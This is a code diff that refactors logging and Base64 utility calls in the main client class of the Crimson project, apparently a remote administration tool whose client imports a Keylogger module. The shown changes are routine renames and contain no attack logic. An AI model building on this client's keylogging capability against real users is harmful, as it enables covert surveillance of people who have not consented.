@@ -25,12 +25,12 @@ import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.core.Common;
+import com.subterranean_security.crimson.core.misc.AuthenticationGroup;
+import com.subterranean_security.crimson.core.misc.EH;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.storage.ClientDB;
-import com.subterranean_security.crimson.core.util.AuthenticationGroup;
-import com.subterranean_security.crimson.core.util.B64;
-import com.subterranean_security.crimson.core.util.CUtil;
-import com.subterranean_security.crimson.core.util.EH;
+import com.subterranean_security.crimson.core.util.B64Util;
+import com.subterranean_security.crimson.core.util.LogUtil;
 import com.subterranean_security.crimson.core.util.Native;
 
 public class Client {
@@ -41,7 +41,7 @@ public class Client {
 
 	public static void main(String[] args) {
 
-		CUtil.Logging.configure();
+		LogUtil.configure();
 
 		log.info("Initializing client");
 
@@ -56,7 +56,7 @@ public class Client {
 
 		try {
 			clientDB = new ClientDB(new File(Common.Directories.base + "/var/client.db"));
-			ic = ClientConfig.parseFrom(B64.decode(clientDB.getString("ic")));
+			ic = ClientConfig.parseFrom(B64Util.decode(clientDB.getString("ic")));
 		} catch (Exception e) {
 			// TODO: handle exception
 			System.out.println("Database error");
@@ -85,7 +85,7 @@ public class Client {
 	}
 
 	public static void saveIC() {
-		clientDB.storeObject("ic", new String(B64.encode(ic.toByteArray())));
+		clientDB.storeObject("ic", new String(B64Util.encode(ic.toByteArray())));
 	}
 
 	public static AuthenticationGroup getGroup() {
